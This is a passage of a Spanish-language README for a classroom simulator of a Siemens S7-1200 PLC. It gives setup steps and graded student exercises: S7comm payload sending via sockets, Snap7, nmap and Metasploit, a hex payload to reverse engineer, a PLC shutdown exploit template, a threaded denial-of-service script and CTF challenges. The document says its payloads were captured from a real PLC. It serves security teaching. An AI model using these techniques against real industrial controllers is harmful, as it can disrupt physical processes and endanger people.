   bytes.fromhex('PAYLOAD_CAPTURADO')
   ```

---

## 🎮 Uso del simulador

### Para profesores

#### 1. Iniciar el simulador

```bash
# En el servidor del centro
cd /ruta/al/simulador
sudo python3 server.py
```

#### 2. Verificar que está funcionando

```bash
# Verificar puerto 102 (S7comm)
sudo netstat -tulpn | grep 102

# Verificar puerto 8000 (Web)
sudo netstat -tulpn | grep 8000
```

#### 3. Acceder al dashboard

Abrir navegador:
```
http://IP_DEL_SERVIDOR:8000
```

#### 4. Monitorizar a los alumnos

```bash
# Ver sesiones activas en tiempo real
curl http://IP_DEL_SERVIDOR:8000/api/sessions | jq

# Ver estados actuales
curl http://IP_DEL_SERVIDOR:8000/api/states | jq
```

#### 5. Resetear el simulador

```bash
# Detener
sudo pkill -f server.py

# Limpiar estados
rm states.json

# Reiniciar
sudo python3 server.py
```

### Para alumnos

#### Opción 1: Usando Python (básico)

```python
#!/usr/bin/env python3
import socket

# Configuración
PLC_IP = "IP_DEL_SIMULADOR"
PLC_PORT = 102

# Payload para apagar el PLC (ejemplo)
# NOTA: Este es un ejemplo, debes descubrir los payloads correctos
payload_off = bytes.fromhex('0300004302f080720200...')

# Conectar al PLC
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((PLC_IP, PLC_PORT))

# Enviar comando
s.send(payload_off)

# Recibir respuesta
response = s.recv(1024)
print(f"Respuesta del PLC: {response.hex()}")

# Cerrar conexión
s.close()
```

#### Opción 2: Usando Snap7 (avanzado)

```python
import snap7
from snap7.util import *

# Conectar al PLC
plc = snap7.client.Client()
plc.connect('IP_DEL_SIMULADOR', 0, 1)

# Leer área de salidas (QB0)
data = plc.read_area(snap7.types.Areas.PA, 0, 0, 1)
print(f"Valor actual: {data.hex()}")

# Escribir en salida digital
plc.write_area(snap7.types.Areas.PA, 0, 0, bytes([0x01]))

plc.disconnect()
```

#### Opción 3: Usando Scapy (fuzzing)

```python
from scapy.all import *

# Construir payload S7comm manualmente
payload = bytes.fromhex('03000043...')  # Tu payload

# Enviar
s = socket.socket()
s.connect(('IP_DEL_SIMULADOR', 102))
s.send(payload)
response = s.recv(1024)
print(response.hex())
s.close()
```

#### Opción 4: Usando nmap (reconocimiento)

```bash
# Escanear puertos
nmap -p 100-105 IP_DEL_SIMULADOR

# Scripts específicos S7
nmap -p 102 --script s7-info IP_DEL_SIMULADOR
```

#### Opción 5: Usando metasploit

```bash
# Iniciar metasploit
msfconsole

# Usar módulo S7
use auxiliary/scanner/scada/s7_plc_enum
set RHOSTS IP_DEL_SIMULADOR
run
```

---

## 📚 Ejercicios prácticos para alumnos

### Nivel 1: Reconocimiento (Principiante)

#### Ejercicio 1.1: Descubrimiento de puertos
**Objetivo:** Identificar que hay un PLC en la red

**Tareas:**
1. Usa `nmap` para escanear los puertos 100-110
2. Identifica qué puerto está abierto
3. Investiga qué servicio corre en ese puerto

**Comando sugerido:**
```bash
nmap -p 100-110 -sV IP_SIMULADOR
```

**Preguntas:**
- ¿Qué puerto está abierto?
- ¿Qué protocolo industrial corre en ese puerto?
- ¿Cómo sabes que es un dispositivo Siemens?

#### Ejercicio 1.2: Exploración del dashboard
**Objetivo:** Familiarizarse con la interfaz web

**Tareas:**
1. Accede al dashboard en el puerto 8000
2. Identifica cuántas salidas digitales hay
3. Identifica cuántas entradas digitales hay
4. Anota el estado inicial de todos los elementos

**Preguntas:**
- ¿Cuál es el estado inicial del PLC?
- ¿Qué significa el estado "unknown"?
- ¿Qué versión de firmware tiene el PLC?

#### Ejercicio 1.3: API REST
**Objetivo:** Obtener información programáticamente

**Tareas:**
1. Usa `curl` para consultar `/api/states`
2. Guarda la respuesta en un archivo JSON
3. Analiza la estructura de datos

**Comando:**
```bash
curl http://IP_SIMULADOR:8000/api/states > estado_inicial.json
cat estado_inicial.json | jq
```

**Preguntas:**
- ¿Cuántos campos tiene el objeto JSON?
- ¿Cómo está estructurada la información?

---

### Nivel 2: Análisis de protocolo (Intermedio)

#### Ejercicio 2.1: Captura de tráfico
**Objetivo:** Capturar y analizar tráfico S7comm

**Tareas:**
1. Inicia Wireshark o tcpdump
2. Filtra por el puerto 102
3. Ejecuta un script que se conecte al PLC
4. Analiza los paquetes capturados

**Comando tcpdump:**
```bash
sudo tcpdump -i any -w captura.pcap port 102
```

**Preguntas:**
- ¿Cuántos paquetes se intercambiaron?
- ¿Qué tamaño tienen los payloads?
- ¿Identificas el patrón TPKT/COTP/S7comm?

#### Ejercicio 2.2: Ingeniería inversa de payloads
**Objetivo:** Descubrir la estructura de un payload

**Se te proporciona este payload:**
```
0300002502f08032010000001f000e00060501120a10010001000082000000000300010100
```

**Tareas:**
1. Separa el payload en capas (TPKT, COTP, S7comm)
2. Identifica qué comando representa
3. Identifica a qué salida digital afecta
4. Determina si activa o desactiva

**Pistas:**
- Los primeros 4 bytes son el header TPKT
- Los siguientes 3 bytes son el header COTP
- El resto es S7comm

#### Ejercicio 2.3: Construcción de payload
**Objetivo:** Crear un payload desde cero

**Tareas:**
1. Toma el payload de activar %Q0.0
2. Modifícalo para activar %Q0.5
3. Prueba tu payload modificado
4. Verifica en el dashboard que funciona

**Pista:** Solo necesitas cambiar el offset de la salida.

---

### Nivel 3: Explotación (Avanzado)

#### Ejercicio 3.1: Script de apagado
**Objetivo:** Crear un exploit que apague el PLC

**Requisitos:**
- Lenguaje: Python 3
- Debe conectarse al puerto 102
- Debe enviar el payload correcto
- Debe verificar la respuesta

**Plantilla:**
```python
#!/usr/bin/env python3
import socket

def apagar_plc(ip, port=102):
    # TODO: Implementar
    pass

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 2:
        print(f"Uso: {sys.argv[0]} <IP_PLC>")
        sys.exit(1)
    
    apagar_plc(sys.argv[1])
```

**Criterios de evaluación:**
- [ ] Se conecta correctamente
- [ ] Envía el payload de apagado
- [ ] Captura la respuesta
- [ ] Maneja errores (timeout, conexión rechazada)
- [ ] Verifica que el PLC se apagó (API REST)

#### Ejercicio 3.2: Framework de control completo
**Objetivo:** Crear una clase para controlar todas las salidas

**Requisitos:**
```python
class PLCController:
    def __init__(self, ip):
        pass
    
    def conectar(self):
        pass
    
    def apagar_plc(self):
        pass
    
    def encender_plc(self):
        pass
    
    def activar_salida(self, numero_salida):
        # numero_salida: 0-9 (%Q0.0-%Q1.1)
        pass
    
    def desactivar_salida(self, numero_salida):
        pass
    
    def leer_estado(self):
        # Usar API REST
        pass
    
    def desconectar(self):
        pass
```

**Ejemplo de uso:**
```python
plc = PLCController("192.168.1.100")
plc.conectar()
plc.encender_plc()
plc.activar_salida(0)  # %Q0.0
plc.activar_salida(3)  # %Q0.3
print(plc.leer_estado())
plc.desconectar()
```

#### Ejercicio 3.3: Ataque de denegación de servicio
**Objetivo:** Analizar la resistencia del simulador

**ADVERTENCIA:** Solo realizar contra el simulador, NUNCA contra PLC reales.

**Tareas:**
1. Crea múltiples conexiones simultáneas
2. Envía payloads aleatorios rápidamente
3. Observa el comportamiento del simulador
4. Documenta qué sucede

**Código ejemplo:**
```python
import socket
import threading

def atacar():
    while True:
        try:
            s = socket.socket()
            s.connect(('IP_SIMULADOR', 102))
            s.send(b'PAYLOAD_RANDOM')
            s.close()
        except:
            pass

# Lanzar 100 hilos
for i in range(100):
    threading.Thread(target=atacar, daemon=True).start()

input("Presiona Enter para detener...")
```

**Preguntas:**
- ¿El simulador se cae?
- ¿Cuántas conexiones simultáneas soporta?
- ¿Propuestas de mitigación?

---

### Nivel 4: CTF Challenges

#### Challenge 1: "La Secuencia Secreta"
**Dificultad:** ⭐⭐⭐

**Descripción:**
Existe una secuencia específica de activación de salidas que, cuando se ejecuta correctamente, revela una flag oculta en el log del servidor.

**Pistas:**
1. Son 5 salidas digitales
2. El orden importa
3. Debes esperar 2 segundos entre cada activación
4. La flag está en formato: `FLAG{XXXX-XXXX-XXXX}`

**Objetivo:**
Descubrir la secuencia y obtener la flag.

#### Challenge 2: "El Payload Perdido"
**Dificultad:** ⭐⭐⭐⭐

**Descripción:**
Hay un payload no documentado que activa una función especial del simulador. Este payload NO está en el diccionario de payloads conocidos.

**Pistas:**
1. Es similar a los payloads de salidas digitales
2. Usa el offset 255 (0xFF)
3. La respuesta del servidor será diferente

**Objetivo:**
Construir el payload secreto y descubrir qué hace.

#### Challenge 3: "Hacker vs Hacker"
**Dificultad:** ⭐⭐⭐⭐⭐

**Descripción:**
Competición en tiempo real. Dos equipos intentan controlar el PLC simultáneamente.

**Reglas:**
1. Cada equipo debe mantener SU salida digital encendida
2. Puede intentar apagar las salidas del equipo contrario
3. Gana quien tenga más tiempo acumulado con su salida activa
4. Duración: 10 minutos

**Asignación:**
- Equipo A: %Q0.0
- Equipo B: %Q0.1

**Habilidades evaluadas:**
- Velocidad de scripting
- Estrategia de ataque/defensa
- Automatización
- Resistencia bajo presión

---

## ❓ Preguntas frecuentes

### Para profesores

**P: ¿Necesito PLCs reales para usar este simulador?**
R: No. El simulador es completamente autónomo. Aunque tener un PLC real ayuda a comparar, no es necesario.

**P: ¿Cuántos alumnos pueden conectarse simultáneamente?**
R: El simulador puede manejar fácilmente 50+ conexiones simultáneas en hardware modesto.

**P: ¿Puedo modificar los payloads?**
R: Sí, pero deben coincidir con el protocolo S7comm real. Los payloads actuales fueron capturados de un PLC físico.

**P: ¿Cómo evalúo a los alumnos con esto?**
R: Puedes:
1. Revisar `/api/sessions` para ver qué payloads enviaron
2. Crear retos específicos (ej: "apaga el PLC en menos de 5 minutos")
3. Organizar CTFs con el simulador
4. Pedir informes técnicos con capturas de Wireshark

**P: ¿Es seguro dejarlo accesible en Internet?**
R: NO. El simulador NO tiene autenticación. Solo debe estar accesible en la red interna del centro o VPN.

**P: ¿Puedo usar esto en exámenes?**
R: Sí. Puedes crear un examen práctico donde los alumnos demuestren sus habilidades en tiempo real.

### Para alumnos

**P: ¿Necesito conocimientos previos de PLCs?**
R: No necesariamente. El simulador te ayudará a aprender sobre PLCs mientras practicas hacking.

**P: ¿Qué herramientas necesito?**
R: Básicas:
- Python 3
- nmap
- Wireshark
- curl

Avanzadas (opcionales):
- Snap7
- Metasploit
- Scapy

**P: ¿Puedo dañar el simulador?**
R: No. Es software, no hardware. El profesor puede reiniciarlo en cualquier momento.

**P: ¿Los payloads funcionan en PLCs reales?**
R: SÍ. Los payloads fueron capturados de un S7-1214C real. Pero NUNCA ataques PLCs reales sin autorización.

**P: No encuentro el payload de [X], ¿me lo das?**
R: Parte del aprendizaje es descubrirlos tú mismo mediante:
1. Análisis de los payloads existentes
2. Ingeniería inversa
3. Fuzzing controlado
4. Lectura de documentación de S7comm

**P: ¿Puedo usar esto en mi portafolio?**
R: Sí. Documentar tus experimentos y exploits es excelente para mostrar tus habilidades.

**P: ¿Esto es legal?**
R: En el contexto educativo y con el simulador proporcionado por el centro, SÍ. Atacar sistemas reales sin autorización es ILEGAL.

---

## 🔧 Troubleshooting

### Problema: "Permission denied" al iniciar

**Síntoma:**
```
[ERROR] Permission denied: port 102
```

**Causa:**
El script necesita privilegios de superusuario para el puerto 102.

**Solución:**
```bash
sudo python3 server.py
```

### Problema: "Address already in use"

**Síntoma:**
```
OSError: [Errno 98] Address already in use
```

**Causa:**
Otro proceso está usando los puertos 102 o 8000.

**Solución:**
```bash
# Encontrar el proceso
sudo netstat -tulpn | grep 102
sudo netstat -tulpn | grep 8000

# Matar el proceso
sudo kill -9 [PID]

# O dejar que el script lo haga automáticamente (ya implementado)
sudo python3 server.py
```

### Problema: No se puede conectar desde otro ordenador

**Síntoma:**
```
Connection refused
```

**Causa:**
Firewall bloqueando los puertos.

**Solución (Ubuntu/Debian):**
```bash
# Permitir puerto 102
sudo ufw allow 102/tcp

# Permitir puerto 8000
sudo ufw allow 8000/tcp

# O desactivar temporalmente el firewall (NO recomendado en producción)
sudo ufw disable
```

### Problema: El dashboard no se actualiza

**Síntoma:**
Los cambios no se reflejan en el navegador.

**Causa:**
Conexión WebSocket perdida.

**Solución:**
1. Abre la consola del navegador (F12)
2. Busca errores de WebSocket
3. Recarga la página (F5)
4. Verifica que el servidor está corriendo

### Problema: "Module not found: fastapi"

**Síntoma:**
```
ModuleNotFoundError: No module named 'fastapi'
```

**Causa:**
Dependencias no instaladas.

**Solución:**
```bash
pip3 install fastapi uvicorn psutil
# O con sudo si es instalación global
sudo pip3 install fastapi uvicorn psutil
```

### Problema: states.json corrupto

**Síntoma:**
El simulador inicia pero todos los estados están mal.

**Causa:**
El archivo JSON se corrompió.

**Solución:**
```bash
# Eliminar el archivo
rm states.json

# Reiniciar el simulador (se creará uno nuevo)
sudo python3 server.py
```

### Problema: El simulador se cuelga

**Síntoma:**
El servidor deja de responder.

**Causa:**
Posible bug o ataque DoS exitoso.

**Solución:**
```bash
# Forzar cierre
sudo pkill -9 -f server.py

# Limpiar puertos
sudo fuser -k 102/tcp
sudo fuser -k 8000/tcp

# Reiniciar
sudo python3 server.py
```

### Problema: Payloads no funcionan

**Síntoma:**
Envías un payload pero no pasa nada.

**Diagnóstico:**
1. Verifica que te conectas al puerto correcto (102)
2. Comprueba que el payload está en hexadecimal correcto
3. Mira los logs del servidor (muestra qué payload recibió)
4. Verifica con Wireshark que el payload se envió completo

**Solución:**
```python
# Asegúrate de usar bytes.fromhex()
payload = bytes.fromhex('03000025...')  # Sin espacios

# Verifica la longitud
print(f"Longitud: {len(payload)} bytes")

# El servidor mostrará el payload recibido en consola
```

---

## 📞 Soporte y contribuciones

### Reportar bugs

Si encuentras un bug:
1. Anota el mensaje de error completo
2. Indica qué estabas haciendo cuando ocurrió
3. Proporciona el payload que causó el problema
4. Abre un issue en GitHub con toda la información

### Contribuir

Contribuciones bienvenidas:
- Nuevos payloads descubiertos
- Mejoras en el dashboard
- Nuevos ejercicios educativos
- Correcciones de bugs
- Traducciones

### Contacto

Para dudas educativas o problemas técnicos, contacta con el equipo docente de tu centro.

---

## 📄 Licencia

```
Este software está en el dominio público.

Puedes hacer lo que quieras con él porque es libre de verdad;
no libre con condiciones como las licencias GNU y otras patrañas similares.

Si se te llena la boca hablando de libertad entonces hazlo realmente libre.

No tienes que aceptar ningún tipo de términos de uso o licencia
para utilizarlo o modificarlo porque va sin CopyLeft.
```

---

## 🙏 Agradecimientos

- A los alumnos que ayudaron a probar el simulador
- A Siemens por crear PLCs educativos accesibles
- A la comunidad de seguridad industrial por compartir conocimiento
- A todos los que contribuyan a mejorar este proyecto

---

## 📚 Referencias y recursos adicionales

### Documentación oficial
- [Siemens S7-1200 Manual](https://support.industry.siemens.com)
- [Protocolo S7comm](https://support.industry.siemens.com)
- [TIA Portal](https://www.siemens.com/tia-portal)

### Herramientas útiles
- [Wireshark](https://www.wireshark.org) - Análisis de tráfico
- [Snap7](http://snap7.sourceforge.net) - Biblioteca S7comm
- [Scapy](https://scapy.net) - Manipulación de paquetes
- [nmap](https://nmap.org) - Escaneo de red

### Lecturas recomendadas
- "Applied Cyber Security and the Smart Grid" - IEEE
- "Industrial Network Security" - Eric D. Knapp
- "Hacking Exposed Industrial Control Systems" - Clint Bodungen

### Comunidades
- ICS-CERT (Industrial Control Systems)
- SCADA Security Forums
- r/AskNetsec
- r/industrialhacking

---

**Versión:** 1.0  
**Última actualización:** Noviembre 2025  
**Autor:** NiPeGun  
**Centro:** Zubiri - CETI - Seguridad Industrial

---
